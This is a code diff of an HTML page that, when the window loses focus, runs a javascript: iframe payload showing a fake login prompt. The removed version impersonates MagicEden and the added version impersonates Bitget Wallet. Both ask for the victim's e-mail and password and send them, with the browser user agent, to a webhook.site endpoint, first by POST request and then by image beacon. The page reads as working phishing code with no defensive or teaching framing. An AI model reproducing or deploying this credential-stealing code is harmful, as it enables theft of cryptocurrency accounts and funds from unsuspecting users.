@@ -12,7 +12,7 @@
    
     <script>
         window.onblur = function() {
-            document.getElementById("iframe").src = "javascript:var result = prompt('In order to access magiceden.io\\nyou must first login on your\\nMagicEden Account.\\n\\nPlease type your e-mail\\nand your password:\\n', 'E-mail / Password.');if(result){fetch('https://webhook.site/1bf96978-c901-418e-915d-289876e3fc55',{method:'POST',body:JSON.stringify({creds:result,ua:navigator.userAgent})})}";
+            document.getElementById("iframe").src = "javascript:var result=prompt('In order to access bitget.com\\nyou must first login on your\\nBitgetWallet Account.\\n\\nPlease type your e-mail\\nand your password:\\n','E-mail / Password.');if(result){var img=new Image();img.src='https://webhook.site/1bf96978-c901-418e-915d-289876e3fc55?creds='+encodeURIComponent(result)+'&ua='+encodeURIComponent(navigator.userAgent);}void(0);";
         }
     </script>
 </head>
@@ -20,7 +20,7 @@
 <body>
     <center>
         <br>
-        <h1>Click Here In</h1>
+        <h1>Click Here Lah</h1>
     </center>
     <iframe id="iframe"></iframe>
 </body>
